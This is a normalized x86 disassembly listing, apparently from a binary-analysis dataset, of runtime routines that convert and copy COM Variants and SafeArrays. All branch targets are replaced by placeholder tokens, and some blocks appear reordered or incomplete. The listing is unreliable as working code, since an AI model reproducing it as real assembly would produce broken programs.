push ebx
push esi
push edi
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x308 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_41bec0
mov eax [ ebp - 0x308 ]
push eax
call VariantClear
call sub_41bec0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x308 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x308 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x30c ] eax
mov eax [ ebp - 0x308 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x30c ] eax
jmp r-xdata
mov ebx [ ebp - 0x314 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x30c ]
movzx eax [ eax ]
mov [ ebp - 0x314 ] eax
mov ebx [ ebp - 0x314 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x314 ]
dec ebx
mov eax ebx
call sub_41bfec
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x31c ] eax
mov eax [ ebp - 0x31c ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x30c ]
push eax
call SafeArrayGetLBound
call sub_41bec0
lea eax [ ebp - 0x310 ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x30c ]
push eax
call SafeArrayGetUBound
call sub_41bec0
mov eax [ ebp - 0x31c ]
mov edx [ ebp - 0x310 ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x31c ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_41c01c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x30c ]
push eax
call SafeArrayPtrOfIndex
call sub_41bec0
mov eax [ ebp - 0x318 ]
call sub_41c288
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_41c1f4
push ebx
push esi
push ecx
mov ebx eax
movzx esi [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_41bec0
jmp r-xdata
cmp si 0x102
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_4068a0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
xor edx edx
call sub_4070a8
jmp r-xdata
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_422ab0
test al al
je r-xdata
mov eax ebx
call sub_41c078
jmp r-xdata
push ebx
call VariantClear
push ebx
call VariantInit
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_41c2a4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_41c2d4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_41c2d4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_41c330
push ebp
mov ebp esp
add esp 0xfffffcdc
push ebx
push esi
push edi
mov [ ebp - 0x30c ] ecx
mov ebx edx
mov [ ebp - 0x308 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_41bec0
push ebx
mov eax [ ebp - 0x308 ]
push eax
call VariantCopy
call sub_41bec0
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x318 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x318 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x318 ]
movzx eax [ eax ]
mov [ ebp - 0x314 ] eax
mov ebx [ ebp - 0x314 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x308 ]
call sub_41c288
mov eax [ ebp - 0x308 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x308 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x314 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_41bc18
mov eax esi
mov [ ebp - 0x324 ] eax
mov eax [ ebp - 0x324 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x318 ]
push eax
call SafeArrayGetLBound
call sub_41bec0
lea eax [ ebp - 0x310 ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x318 ]
push eax
call SafeArrayGetUBound
call sub_41bec0
mov eax [ ebp - 0x324 ]
mov edx [ ebp - 0x310 ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x324 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x314 ]
dec ebx
mov eax ebx
call sub_41c2a4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_41c2d4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x318 ]
push eax
call SafeArrayPtrOfIndex
call sub_41bec0
lea eax [ ebp - 0x320 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_41bec0
mov eax [ ebp - 0x31c ]
mov edx eax
mov eax [ ebp - 0x320 ]
call [ ebp - 0x30c ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c504
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
movzx eax [ esi ]
cmp ax 0x14
jae r-xdata
mov eax ebx
call sub_41c1f4
cmp ax 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_41bec0
jmp r-xdata
cmp ax 0x102
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4068f4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
movzx edi [ esi ]
cmp di 0x4102
je r-xdata
mov [ ebx ] 0x102
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4070a8
jmp r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
cmp di 0x4100
jne r-xdata
cmp di 0x101
jne r-xdata
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_422ab0
test al al
je r-xdata
mov ecx sub_41c4fc
mov edx esi
mov eax ebx
call sub_41c330
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_41bec0
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_41c5f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_41c504
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_41c1f4
sub_41c634
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41c690
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_41c5f0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41c908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c697
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_41c6a0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c6de
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_42033c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4214e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c6e5
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
sub_41c6ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c72a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41fa88
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4214bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c731
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_41c738
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c776
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_420a64
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_421520
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c77d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_41c784
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c7c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4211b0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_421578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7c9
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_41c7d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c80e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4210e4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_42154c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c815
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_41c81c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_41c908
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_41becc
jmp r-xdata
mov edx esi
call sub_41ba38
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_41becc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41c89c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
movzx ebp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_422ab0
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_41c634
jmp r-xdata
mov edx esp
mov eax esi
call sub_422ab0
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_41c81c
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_41c908
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_41c5f0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x15
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41c908
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41c94d ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41c6ec
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_41bfd8
jmp r-xdata
mov eax ebx
call sub_41d304
mov edx eax
mov eax esi
call sub_421364
jmp r-xdata
mov eax ebx
call sub_41ccf4
mov edx eax
mov eax esi
call sub_421298
jmp r-xdata
mov eax ebx
call sub_41e948
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4213b0
jmp r-xdata
mov eax ebx
call sub_41e53c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4213d4
jmp r-xdata
mov eax ebx
call sub_41f350
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_421400
jmp r-xdata
mov eax ebx
call sub_41ed54
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_42142c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41c6a0
jmp r-xdata
mov eax ebx
call sub_41dfd4
mov edx eax
mov eax esi
call sub_421458
jmp r-xdata
mov eax ebx
call sub_41d1a4
mov edx eax
mov eax esi
call sub_421344
jmp r-xdata
mov eax ebx
call sub_41d258
mov edx eax
mov eax esi
call sub_4212b8
jmp r-xdata
mov eax ebx
call sub_41d400
mov edx eax
mov eax esi
call sub_4212d8
jmp r-xdata
mov eax ebx
call sub_41d4dc
mov edx eax
mov eax esi
call sub_4212f8
jmp r-xdata
mov eax ebx
call sub_41d82c
push edx
push eax
mov eax esi
call sub_421384
jmp r-xdata
mov eax ebx
call sub_41dcbc
push edx
push eax
mov eax esi
call sub_421318
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41c784
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41c7d0
jmp r-xdata
mov dx 0x101
call sub_41ba38
jmp r-xdata
dec edx
je r-xdata
mov eax esi
call sub_41c288
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_41c738
jmp r-xdata
jmp r-xdata
xor edx edx
mov ax 0x1
call sub_41ba38
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41c89c
sub_41cb5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41cbff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_411bc4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc06
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
mov eax ebx
call sub_41dfd4
and eax 0x7f
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x3
call sub_41becc
jmp r-xdata
sub_41cc10
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x3
call sub_41becc
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_41cc4c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41cca0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_41c5f0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_41ccf4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cca7
lea eax [ ebp - 0x14 ]
call sub_41c288
retn
sub_41ccb0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_41ccf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41d175
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41cd27 ]
mov eax [ ebp - 0x8 ]
call sub_41cb5c
mov [ ebp - 0xc ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cb5c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41ccf4
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cc10
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cc4c
mov [ ebp - 0xc ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_41ba38
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_41cb5c
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ccb0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cc10
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_41cc10
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_41cf83 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cb5c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41ccf4
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_4054b0
sub_41d1a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_41ba38
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41d234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ccf4
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
sub_41d258
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_41ba38
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41d2df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ccf4
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
sub_41d304
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_41d3db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ccf4
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_41d32d ]
jmp [ eax * 4 + jump_table_41d33f ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
